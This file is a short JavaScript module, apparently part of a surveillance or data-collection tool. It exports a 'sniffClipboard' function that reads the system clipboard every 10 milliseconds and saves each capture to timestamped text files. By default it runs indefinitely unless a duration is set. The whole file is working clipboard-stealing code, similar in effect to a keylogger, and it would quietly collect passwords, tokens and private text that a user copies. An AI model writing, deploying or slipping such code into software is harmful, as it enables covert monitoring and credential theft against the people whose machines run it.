import { delay } from "./helpers.js";
import * as fs from "fs";
import path from "path";
import { Clipboard } from "@napi-rs/clipboard";
const clipboard = new Clipboard();
async function executeSniffer(abortController, saveDir) {
    await fs.promises.mkdir(saveDir, {
        recursive: true,
    });
    while (!abortController.signal.aborted) {
        try {
            const data = clipboard.getText();
            const filename = path.join(saveDir, `${new Date().toUTCString().replace(/\W/g, "_")}.txt`);
            await fs.promises.writeFile(filename, data);
        }
        catch (e) {
            console.error(e);
        }
        await delay(10);
    }
}
export default function sniffClipboard(parameters) {
    const unboundedDuration = parameters.duration ?? Infinity;
    const duration = unboundedDuration < (2 ** 32 - 1) ? unboundedDuration : Infinity;
    const abortController = new AbortController();
    executeSniffer(abortController, path.join(parameters.outDir, "clipboard")).then();
    if (duration !== Infinity) {
        setTimeout(() => {
            abortController.abort();
        }, duration * 1000);
    }
    return abortController;
}
